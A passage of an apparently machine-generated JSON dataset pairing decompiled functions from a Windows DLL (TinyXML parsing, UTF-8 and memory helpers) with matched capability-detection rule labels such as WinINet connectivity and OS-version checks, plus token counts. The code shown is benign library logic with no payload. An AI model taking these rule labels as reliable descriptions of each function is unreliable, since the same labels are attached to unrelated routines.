            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.18000e2c0(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    ulong arg1_00;\n    uchar *puVar1;\n    uchar auStack152 [40];\n    uchar auStack112 [40];\n    uchar auStack72 [32];\n    int64_t iStack40;\n    uint32_t uStack32;\n    ulong uStack24;\n    uint64_t uStack16;\n    \n    uStack24 = 0xfffffffffffffffe;\n    uStack16 = *0x180040248 ^ auStack152;\n    uStack32 = 0;\n    fcn.18000e580(auStack72);\n    arg1_00 = fcn.1800020d0(arg2);\n    iStack40 = fcn.180024698(arg1_00, arg3);\n    while (iStack40 != 0) {\n        fcn.180001e80(auStack112, iStack40);\n        puVar1 = auStack112;\n        fcn.18000e660(auStack72, puVar1);\n        fcn.180001ef0(auStack112, puVar1);\n        iStack40 = fcn.180024698(0, arg3);\n    }\n    puVar1 = auStack72;\n    fcn.18000e5c0(arg1, puVar1);\n    uStack32 = uStack32 | 1;\n    fcn.18000e630(auStack72);\n    fcn.180001ef0(arg2, puVar1);\n    fcn.180023980(uStack16 ^ auStack152);\n    return;\n}\n",
        "token_count": 353
    },
    "18000ea9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.18000ea90(int64_t *arg1)\n\n{\n    if (*arg1 != 0) {\n        fcn.18000bcf0(arg1);\n        fcn.18000ef40(arg1, *arg1, arg1[1]);\n        fcn.18000d120(arg1 + 3, *arg1, (arg1[2] - *arg1) / 0x28);\n    }\n    *arg1 = 0;\n    arg1[1] = 0;\n    arg1[2] = 0;\n    return;\n}\n",
        "token_count": 128
    },
    "18000ece": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.18000ece0(int64_t *arg1, uint64_t arg2)\n\n{\n    uint64_t uVar1;\n    int64_t arg4;\n    int64_t iVar2;\n    \n    uVar1 = fcn.18000ee90(arg1);\n    if (uVar1 < arg2) {\n        fcn.18000f030(arg1);\n    }\n    else {\n        uVar1 = fcn.18000ee30(arg1);\n        if (uVar1 < arg2) {\n            arg4 = fcn.18000f190(arg1 + 3, arg2);\n            fcn.18000f2d0(arg1, *arg1, arg1[1], arg4);\n            iVar2 = fcn.18000ee60(arg1);\n            if (*arg1 != 0) {\n                fcn.18000ef40(arg1, *arg1, arg1[1]);\n                fcn.18000d120(arg1 + 3, *arg1, (arg1[2] - *arg1) / 0x28);\n            }\n            fcn.18000bcf0(arg1);\n            arg1[2] = arg4 + arg2 * 0x28;\n            arg1[1] = arg4 + iVar2 * 0x28;\n            *arg1 = arg4;\n        }\n    }\n    return;\n}\n",
        "token_count": 304
    },
    "18000f1b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00018000f1d9)\n\nulong fcn.18000f1b0(ulong arg1)\n\n{\n    return 0x666666666666666;\n}\n",
        "token_count": 48
    },
    "18000f3b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t fcn.18000f3b0(uint64_t arg1, ulong arg2)\n\n{\n    int64_t iStack40;\n    uchar auStack32 [32];\n    \n    iStack40 = 0;\n    if ((arg1 != 0) && ((0x666666666666666 < arg1 || (iStack40 = fcn.180023ef8(arg1 * 0x28),  iStack40 == 0)))) {\n        fcn.180001220(auStack32, 0);\n        fcn.180025954(auStack32, 0x18003e970);\n    }\n    return iStack40;\n}\n",
        "token_count": 144
    },
    "18000f46": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.18000f460(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    int64_t arg1_00;\n    ulong arg2_00;\n    \n    arg1_00 = fcn.1800012d0(0x28, arg2);\n    if (arg1_00 != 0) {\n        arg2_00 = fcn.18000eb30(arg3);\n        fcn.18000e4d0(arg1_00, arg2_00);\n    }\n    return;\n}\n",
        "token_count": 116
    },
    "18000f4d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.18000f4d0(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    int64_t arg1_00;\n    ulong arg2_00;\n    \n    arg1_00 = fcn.1800012d0(0x28, arg2);\n    if (arg1_00 != 0) {\n        arg2_00 = fcn.18000eb30(arg3);\n        fcn.180001db0(arg1_00, arg2_00);\n    }\n    return;\n}\n",
        "token_count": 116
    },
    "18000f6a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.18000f6a0(ulong arg1, ulong arg2)\n\n{\n    int64_t arg1_00;\n    ulong arg2_00;\n    \n    arg1_00 = fcn.1800012d0(0x28, arg1);\n    if (arg1_00 != 0) {\n        arg2_00 = fcn.18000eb30(arg2);\n        fcn.180001db0(arg1_00, arg2_00);\n    }\n    return;\n}\n",
        "token_count": 112
    },
    "18000fa8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.18000fa80(int64_t **arg1, int64_t arg2, int64_t arg3)\n\n{\n    uchar auVar1 [16];\n    ulong arg1_00;\n    int64_t *piVar2;\n    \n    if (arg3 == 0) {\n        *arg1 = 0x180049d78;\n    }\n    else {\n        auVar1 = ZEXT816(4) * ZEXT816((arg3 + 0x1bU) / 4);\n        arg1_00 = SUB168(auVar1, 0);\n        if (SUB168(auVar1 >> 0x40, 0) != 0) {\n            arg1_00 = 0xffffffffffffffff;\n        }\n        piVar2 = fcn.180023ef8(arg1_00);\n        *arg1 = piVar2;\n        **arg1 = arg2;\n        *(*arg1 + arg2 + 0x10) = 0;\n        (*arg1)[1] = arg3;\n    }\n    return;\n}\n",
        "token_count": 232
    },
    "18000ff2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.18000ff20(int64_t **arg1)\n\n{\n    return **arg1 == 0;\n}\n",
        "token_count": 27
    },
    "180010c2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.180010c20(code **arg1)\n\n{\n    ulong *puVar1;\n    ulong *puStack48;\n    \n    *arg1 = vtable.TiXmlNode.0;\n    puVar1 = arg1[5];\n    while (puStack48 = puVar1,  puStack48 != NULL) {\n        puVar1 = puStack48[9];\n        if (puStack48 != NULL) {\n            (***puStack48)(puStack48, 1);\n        }\n    }\n    fcn.18000f8f0(arg1 + 7);\n    fcn.1800100c0(arg1);\n    return;\n}\n",
        "token_count": 143
    },
    "180010d4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.180010d40(int64_t arg1)\n\n{\n    ulong *puVar1;\n    ulong *puStack48;\n    \n    puVar1 = *(arg1 + 0x28);\n    while (puStack48 = puVar1,  puStack48 != NULL) {\n        puVar1 = puStack48[9];\n        if (puStack48 != NULL) {\n            (***puStack48)(puStack48, 1);\n        }\n    }\n    *(arg1 + 0x28) = 0;\n    *(arg1 + 0x30) = 0;\n    return;\n}\n",
        "token_count": 135
    },
    "180010df": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong * fcn.180010df0(int64_t arg1, ulong *arg2)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    ulong arg1_00;\n    \n    iVar1 = fcn.1800101d0(arg2);\n    if (iVar1 == 0) {\n        if (arg2 != NULL) {\n            (***arg2)(arg2, 1);\n        }\n        iVar2 = fcn.1800101e0(arg1);\n        if (iVar2 != 0) {\n            arg1_00 = fcn.1800101e0(arg1);\n            fcn.180013d00(arg1_00, 0xf, 0, 0);\n        }\n        arg2 = NULL;\n    }\n    else {\n        arg2[3] = arg1;\n        arg2[8] = *(arg1 + 0x30);\n        arg2[9] = 0;\n        if (*(arg1 + 0x30) == 0) {\n            *(arg1 + 0x28) = arg2;\n        }\n        else {\n            *(*(arg1 + 0x30) + 0x48) = arg2;\n        }\n        *(arg1 + 0x30) = arg2;\n    }\n    return arg2;\n}\n",
        "token_count": 286
    },
    "180010f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.180010f00(ulong arg1)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    int64_t *piStack24;\n    \n    piStack24 = fcn.180010170(arg1);\n    while( true ) {\n        if (piStack24 == NULL) {\n            return 0;\n        }\n        iVar1 = (**(*piStack24 + 0x30))(piStack24);\n        if (iVar1 != 0) break;\n        piStack24 = fcn.180010180(piStack24);\n    }\n    uVar2 = (**(*piStack24 + 0x30))(piStack24);\n    return uVar2;\n}\n",
        "token_count": 149
    },
    "180010f7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.180010f70(ulong arg1)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    int64_t *piStack24;\n    \n    piStack24 = fcn.180010180(arg1);\n    while( true ) {\n        if (piStack24 == NULL) {\n            return 0;\n        }\n        iVar1 = (**(*piStack24 + 0x30))(piStack24);\n        if (iVar1 != 0) break;\n        piStack24 = fcn.180010180(piStack24);\n    }\n    uVar2 = (**(*piStack24 + 0x30))(piStack24);\n    return uVar2;\n}\n",
        "token_count": 149
    },
    "180010fe": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.180010fe0(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    int64_t *piStack24;\n    \n    piStack24 = arg1;\n    while( true ) {\n        if (piStack24 == NULL) {\n            return 0;\n        }\n        iVar1 = (**(*piStack24 + 0x20))(piStack24);\n        if (iVar1 != 0) break;\n        piStack24 = piStack24[3];\n    }\n    uVar2 = (**(*piStack24 + 0x20))(piStack24);\n    return uVar2;\n}\n",
        "token_count": 141
    },
    "18001116": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.180011160(int64_t arg1)\n\n{\n    int64_t iVar1;\n    ulong *arg2;\n    \n    fcn.180010d40(arg1);\n    while (iVar1 = fcn.1800103e0(arg1 + 0x50),  iVar1 != 0) {\n        arg2 = fcn.1800103e0(arg1 + 0x50);\n        fcn.180012480(arg1 + 0x50, arg2);\n        if (arg2 != NULL) {\n            (***arg2)(arg2, 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 137
    },
    "18001120": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.180011200(int64_t arg1, ulong arg2)\n\n{\n    int64_t arg1_00;\n    ulong uVar1;\n    \n    arg1_00 = fcn.180012510(arg1 + 0x50, arg2);\n    if (arg1_00 == 0) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = fcn.1800102b0(arg1_00);\n    }\n    return uVar1;\n}\n",
        "token_count": 110
    },
    "18001125": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.180011250(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    int64_t arg1_00;\n    \n    arg1_00 = fcn.180012590(arg1 + 0x50, arg2);\n    if (arg1_00 != 0) {\n        fcn.180010300(arg1_00, arg3);\n    }\n    return;\n}\n",
        "token_count": 89
    },
    "18001153": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.180011530(int64_t arg1, ulong arg2)\n\n{\n    ulong uVar1;\n    ulong arg2_00;\n    int64_t iStack40;\n    int64_t *piStack32;\n    \n    fcn.180010ce0(arg1, arg2);\n    for (iStack40 = fcn.1800103e0(arg1 + 0x50); iStack40 != 0; iStack40 = fcn.180011a30(iStack40)) {\n        uVar1 = fcn.1800102b0(iStack40);\n        arg2_00 = fcn.180010290(iStack40);\n        fcn.180011250(arg2, arg2_00, uVar1);\n    }\n    for (piStack32 = *(arg1 + 0x28); piStack32 != NULL; piStack32 = fcn.180010180(piStack32)) {\n        uVar1 = (**(*piStack32 + 0x78))(piStack32);\n        fcn.180010df0(arg2, uVar1);\n    }\n    return;\n}\n",
        "token_count": 242
    },
    "1800117d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1800117d0(int64_t arg1, int64_t arg2)\n\n{\n    ulong arg2_00;\n    int64_t *piStack24;\n    \n    fcn.180010ce0(arg1, arg2);\n    *(arg2 + 0x50) = *(arg1 + 0x50);\n    *(arg2 + 0x54) = *(arg1 + 0x54);\n    fcn.18000fe60(arg2 + 0x58, arg1 + 0x58);\n    *(arg2 + 0x60) = *(arg1 + 0x60);\n    *(arg2 + 100) = *(arg1 + 100);\n    *(arg2 + 0x6c) = *(arg1 + 0x6c);\n    for (piStack24 = *(arg1 + 0x28); piStack24 != NULL; piStack24 = fcn.180010180(piStack24)) {\n        arg2_00 = (**(*piStack24 + 0x78))(piStack24);\n        fcn.180010df0(arg2, arg2_00);\n    }\n    return;\n}\n",
        "token_count": 256
    },
    "180011a9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.180011a90(int64_t arg1, int64_t arg2, ulong arg3, int64_t arg4)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    uchar auStack56 [8];\n    uchar auStack48 [8];\n    ulong uStack40;\n    ulong uStack32;\n    ulong uStack24;\n    \n    uStack40 = 0xfffffffffffffffe;\n    fcn.18000f8d0(auStack48);\n    fcn.18000f8d0(auStack56);\n    fcn.180010890(arg1 + 0x20, auStack48);\n    fcn.180010890(arg1 + 0x28, auStack56);\n    iVar1 = fcn.18000ff70(arg1 + 0x28);\n    if (iVar1 == *0x180039ac0) {\n        if (arg2 != 0) {\n            uStack32 = fcn.18000fa40(auStack56);\n            uVar2 = fcn.18000fa40(auStack48);\n            fcn.180024990(arg2, \"%s=\\\"%s\\\"\", uVar2, uStack32);\n        }\n        if (arg4 != 0) {\n            fcn.18000f910(arg4, auStack48);\n            fcn.18000feb0(arg4, 0x180038b1c);\n            fcn.18000f910(arg4, auStack56);\n            fcn.18000feb0(arg4, 0x180038b2c);\n        }\n    }\n    else {\n        if (arg2 != 0) {\n            uStack24 = fcn.18000fa40(auStack56);\n            uVar2 = fcn.18000fa40(auStack48);\n            fcn.180024990(arg2, \"%s=\\'%s\\'\", uVar2, uStack24);\n        }\n        if (arg4 != 0) {\n            fcn.18000f910(arg4, auStack48);\n            fcn.18000feb0(arg4, 0x180038b3c);\n            fcn.18000f910(arg4, auStack56);\n            fcn.18000feb0(arg4, 0x180038b5c);\n        }\n    }\n    fcn.18000f8f0(auStack56);\n    fcn.18000f8f0(auStack48);\n    return;\n}\n",
        "token_count": 538
    },
    "18001259": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t fcn.180012590(ulong arg1, ulong arg2)\n\n{\n    int64_t arg1_00;\n    int64_t iStack40;\n    int64_t iStack16;\n    \n    iStack40 = fcn.180012510(arg1, arg2);\n    if (iStack40 == 0) {\n        arg1_00 = fcn.180023ef8(0x40);\n        if (arg1_00 == 0) {\n            iStack16 = 0;\n        }\n        else {\n            iStack16 = fcn.180010210(arg1_00);\n        }\n        iStack40 = iStack16;\n        fcn.180012430(arg1, iStack16);\n        fcn.1800102d0(iStack16, arg2);\n    }\n    return iStack40;\n}\n",
        "token_count": 183
    },
    "1800126e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint8_t * fcn.1800126e0(uint8_t *arg1, uint8_t *arg2, int32_t *arg3, ulong arg4)\n\n{\n    int32_t iStack24;\n    \n    if (arg4 == 1) {\n        *arg3 = *(*arg1 * 4 + 0x180039380);\n    }\n    else {\n        *arg3 = 1;\n    }\n    if (*arg3 == 1) {\n        if (*arg1 == 0x26) {\n            arg1 = fcn.1800130a0(arg1, arg2, arg3, arg4);\n        }\n        else {\n            *arg2 = *arg1;\n            arg1 = arg1 + 1;\n        }\n    }\n    else if (*arg3 == 0) {\n        arg1 = NULL;\n    }\n    else {\n        for (iStack24 = 0; (arg1[iStack24] != 0 && (iStack24 < *arg3)); iStack24 = iStack24 + 1) {\n            arg2[iStack24] = arg1[iStack24];\n        }\n        arg1 = arg1 + *arg3;\n    }\n    return arg1;\n}\n",
        "token_count": 265
    },
    "1800127f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.1800127f0(ulong arg1, ulong arg2)\n\n{\n    uint64_t uVar1;\n    \n    if (arg2 == 1) {\n        if (arg1 < 0x80) {\n            uVar1 = fcn.180024e14(arg1);\n        }\n        else {\n            uVar1 = arg1;\n        }\n    }\n    else {\n        uVar1 = fcn.180024e14(arg1);\n    }\n    return uVar1;\n}\n",
        "token_count": 112
    },
    "1800128a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1800128a0(ulong arg1, int64_t arg2, int32_t *arg3)\n\n{\n    uint32_t uStackX8;\n    uint8_t *puStackX16;\n    uchar auStack72 [8];\n    uint auStack64 [4];\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack32;\n    uint uStack28;\n    int32_t iStack24;\n    uint64_t uStack16;\n    \n    uStack16 = *0x180040248 ^ auStack72;\n    uStack32 = 0xbf;\n    uStack28 = 0x80;\n    auStack64[0] = 0;\n    auStack64[1] = 0;\n    auStack64[2] = 0xc0;\n    auStack64[3] = 0xe0;\n    uStack48 = 0xf0;\n    uStack44 = 0xf8;\n    uStack40 = 0xfc;\n    if (arg1 < 0x80) {\n        *arg3 = 1;\n    }\n    else if (arg1 < 0x800) {\n        *arg3 = 2;\n    }\n    else if (arg1 < 0x10000) {\n        *arg3 = 3;\n    }\n    else {\n        if (0x1fffff < arg1) {\n            *arg3 = 0;\n            goto code_r0x000180012a69;\n        }\n        *arg3 = 4;\n    }\n    puStackX16 = arg2 + *arg3;\n    iStack24 = *arg3;\n    uStackX8 = arg1;\n    if (iStack24 != 1) {\n        if (iStack24 != 2) {\n            if (iStack24 != 3) {\n                if (iStack24 != 4) goto code_r0x000180012a69;\n                puStackX16 = puStackX16 + -1;\n                *puStackX16 = arg1 & 0xbf | 0x80;\n                uStackX8 = arg1 >> 6;\n            }\n            puStackX16 = puStackX16 + -1;\n            *puStackX16 = uStackX8 & 0xbf | 0x80;\n            uStackX8 = uStackX8 >> 6;\n        }\n        puStackX16 = puStackX16 + -1;\n        *puStackX16 = uStackX8 & 0xbf | 0x80;\n        uStackX8 = uStackX8 >> 6;\n    }\n    puStackX16[-1] = uStackX8 | auStack64[*arg3];\ncode_r0x000180012a69:\n    fcn.180023980(uStack16 ^ auStack72);\n    return;\n}\n",
        "token_count": 624
    },
    "180012b4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.180012b40(int32_t *arg1, uint8_t *arg2, ulong arg3)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    uint8_t *puStack40;\n    int32_t iStack32;\n    int32_t iStack28;\n    int32_t iStack16;\n    \n    if (0 < arg1[4]) {\n        iStack28 = *arg1;\n        iStack32 = arg1[1];\n        puVar2 = *(arg1 + 2);\n        while (puStack40 = puVar2,  puStack40 < arg2) {\n            uVar1 = *puStack40;\n            if (uVar1 == 0) {\n                return;\n            }\n            if (uVar1 == 9) {\n                iStack32 = (iStack32 / arg1[4] + 1) * arg1[4];\n                puVar2 = puStack40 + 1;\n            }\n            else if (uVar1 == 10) {\n                iStack28 = iStack28 + 1;\n                iStack32 = 0;\n                puVar2 = puStack40 + 1;\n                if (puStack40[1] == 0xd) {\n                    puVar2 = puStack40 + 2;\n                }\n            }\n            else if (uVar1 == 0xd) {\n                iStack28 = iStack28 + 1;\n                iStack32 = 0;\n                puVar2 = puStack40 + 1;\n                if (puStack40[1] == 10) {\n                    puVar2 = puStack40 + 2;\n                }\n            }\n            else if (uVar1 == 0xef) {\n                if (arg3 == 1) {\n                    puVar2 = puStack40;\n                    if ((puStack40[1] != 0) && (puStack40[2] != 0)) {\n                        if ((puStack40[1] == 0xbb) && (puStack40[2] == 0xbf)) {\n                            puVar2 = puStack40 + 3;\n                        }\n                        else if ((puStack40[1] == 0xbf) && (puStack40[2] == 0xbe)) {\n                            puVar2 = puStack40 + 3;\n                        }\n                        else if ((puStack40[1] == 0xbf) && (puStack40[2] == 0xbf)) {\n                            puVar2 = puStack40 + 3;\n                        }\n                        else {\n                            iStack32 = iStack32 + 1;\n                            puVar2 = puStack40 + 3;\n                        }\n                    }\n                }\n                else {\n                    iStack32 = iStack32 + 1;\n                    puVar2 = puStack40 + 1;\n                }\n            }\n            else if (arg3 == 1) {\n                iStack16 = *(*puStack40 * 4 + 0x180039380);\n                if (iStack16 == 0) {\n                    iStack16 = 1;\n                }\n                iStack32 = iStack32 + 1;\n                puVar2 = puStack40 + iStack16;\n            }\n            else {\n                iStack32 = iStack32 + 1;\n                puVar2 = puStack40 + 1;\n            }\n        }\n        *arg1 = iStack28;\n        arg1[1] = iStack32;\n        *(arg1 + 2) = puStack40;\n    }\n    return;\n}\n",
        "token_count": 766
    },
    "180012df": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar * fcn.180012df0(char *arg1, ulong arg2)\n\n{\n    char cVar1;\n    char *pcStackX8;\n    \n    if ((arg1 == NULL) || (*arg1 == '\\0')) {\n        pcStackX8 = NULL;\n    }\n    else {\n        pcStackX8 = arg1;\n        if (arg2 == 1) {\n            while (*pcStackX8 != '\\0') {\n                if (((*pcStackX8 == -0x11) && (pcStackX8[1] == -0x45)) && (pcStackX8[2] == -0x41)) {\n                    pcStackX8 = pcStackX8 + 3;\n                }\n                else if (((*pcStackX8 == -0x11) && (pcStackX8[1] == -0x41)) && (pcStackX8[2] == -0x42)) {\n                    pcStackX8 = pcStackX8 + 3;\n                }\n                else if (((*pcStackX8 == -0x11) && (pcStackX8[1] == -0x41)) && (pcStackX8[2] == -0x41)) {\n                    pcStackX8 = pcStackX8 + 3;\n                }\n                else {\n                    cVar1 = fcn.180012690(*pcStackX8);\n                    if (cVar1 == '\\0') {\n                        return pcStackX8;\n                    }\n                    pcStackX8 = pcStackX8 + 1;\n                }\n            }\n        }\n        else {\n            while ((*pcStackX8 != '\\0' && (cVar1 = fcn.180012690(*pcStackX8),  cVar1 != '\\0'))) {\n                pcStackX8 = pcStackX8 + 1;\n            }\n        }\n    }\n    return pcStackX8;\n}\n",
        "token_count": 410
    },
    "180012f7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint8_t * fcn.180012f70(uint8_t *arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    uint8_t *puStackX8;\n    \n    fcn.18000fe20(arg2, 0x1800387a2);\n    if (((arg1 == NULL) || (*arg1 == 0)) ||\n       ((iVar1 = fcn.180012a80(*arg1, arg3),  puStackX8 = arg1,  iVar1 == 0 && (*arg1 != 0x5f)))) {\n        puStackX8 = NULL;\n    }\n    else {\n        for (; ((puStackX8 != NULL && (*puStackX8 != 0)) &&\n               ((iVar1 = fcn.180012ab0(*puStackX8, arg3),  iVar1 != 0 ||\n                ((((*puStackX8 == 0x5f || (*puStackX8 == 0x2d)) || (*puStackX8 == 0x2e)) || (*puStackX8 == 0x3a))))));\n            puStackX8 = puStackX8 + 1) {\n        }\n        if (puStackX8 != arg1 && -1 < puStackX8 - arg1) {\n            fcn.18000fc30(arg2, arg1, puStackX8 - arg1);\n        }\n    }\n    return puStackX8;\n}\n",
        "token_count": 318
    },
    "1800130a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
